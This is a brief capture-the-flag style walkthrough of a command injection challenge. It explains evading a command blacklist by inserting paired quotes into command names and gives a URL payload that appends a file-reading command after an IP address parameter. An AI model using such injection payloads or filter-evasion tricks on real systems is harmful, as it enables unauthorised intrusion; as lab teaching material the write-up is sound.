# Command Injection Walkthrough

# Challenge
To circumvent blacklisted commands, we can simply add `'` between our command to evade the restriction. Please consider, that we need to provide an even amount of this characters: 
- `c'a't` will work
- `c'at` will not work

```bash
/secondEncounter?param=8.8.8.8; c'a%'t+/etc/hosts
```

![secondEncounterSolution](media/secondEncounterSolution.png)